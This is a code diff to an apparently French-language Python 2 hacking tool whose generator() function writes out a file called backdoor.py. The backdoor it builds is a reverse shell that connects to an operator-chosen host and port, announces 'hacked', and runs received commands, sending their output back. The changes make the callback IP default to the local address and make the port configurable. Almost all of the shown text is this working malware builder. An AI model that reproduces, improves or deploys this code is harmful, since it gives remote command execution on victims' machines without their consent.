@@ -9,8 +9,7 @@
 
 from os.path import *
 from socket import *
-import os
-import sys
+import os, sys, socket
 
 class color:
 	""" Define plain colors """
@@ -346,14 +345,18 @@ def connect_backdoor():
 
 """ générateur de backdoor """
 def generator():
-	IP = raw_input(color.B_GREEN + "> " + color.END + "IP: ")
+	host = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][0]
+	IP = raw_input(color.B_GREEN + "> " + color.END + "IP(" + host + "): ")
+	if(IP == ''): IP = host
 	PORT = raw_input(color.B_GREEN + "> " + color.END + "PORT(80): ")
+	if(PORT == ''): PORT = 80
 	print("\n[" + color.B_BLUE + "INFO" + color.END + "] - Ecriture en cours...")
+	
 	backdoor = open("backdoor.py", "w")
 	backdoor.write("#!/usr/bin/python")
 	backdoor.write("\nimport socket, subprocess, os")
 	backdoor.write("\nHOST = '" + IP + "'")
-	backdoor.write("\nPORT = 80")
+	backdoor.write("\nPORT = " + str(PORT))
 	backdoor.write("\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)")
 	backdoor.write("\ns.connect((HOST, PORT))")
 	backdoor.write("\ns.send('hacked')")
@@ -364,6 +367,7 @@ def generator():
 	backdoor.write("\n	stdout_value = proc.stdout.read() + proc.stderr.read()")
 	backdoor.write("\n	s.send(stdout_value)")
 	backdoor.write("\ns.close()")
+	
 	print("[" + color.B_BLUE + "INFO" + color.END + "] - " + color.GREEN + "Ecriture Terminer" + color.END)
 
 """ Sous-Program """
